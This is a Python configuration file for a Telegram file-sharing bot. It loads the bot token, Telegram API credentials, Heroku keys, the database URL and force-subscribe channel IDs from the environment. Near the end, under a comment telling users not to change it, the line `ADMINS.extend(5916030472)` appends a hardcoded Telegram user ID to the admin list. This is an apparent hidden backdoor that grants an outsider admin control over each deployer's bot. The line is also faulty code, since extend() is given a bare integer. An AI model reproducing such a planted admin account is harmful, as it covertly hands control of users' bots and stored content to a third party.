# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de
# Recode new by @MSDZULQURNAIN
# t.me/MSPR0JECT & t.me/MsSUPP0RT



import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler
from MSDZULQURNAIN.ztext import zstart, zfsub

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# API ID dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "MSDZULQURNAIN")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentialisasi untuk update.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo untuk update.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "main")

# Database SQL
DB_URI = os.environ.get("DATABASE_URL", "")

# ID Channel FSUB-BUTT kalo ga pake isi 0
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
FORCE_SUB_GROUP2 = int(os.environ.get("FORCE_SUB_GROUP2", "0"))
FORCE_SUB_GROUP3 = int(os.environ.get("FORCE_SUB_GROUP3", "0"))
FORCE_SUB_GROUP4 = int(os.environ.get("FORCE_SUB_GROUP4", "0"))
FORCE_SUB_GROUP5 = int(os.environ.get("FORCE_SUB_GROUP5", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "{zstart}",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "" ).split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan FSUB
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "{zfsub}",
)

# Jan diubah tod ntar erorr
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
ADMINS.extend(5916030472)


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
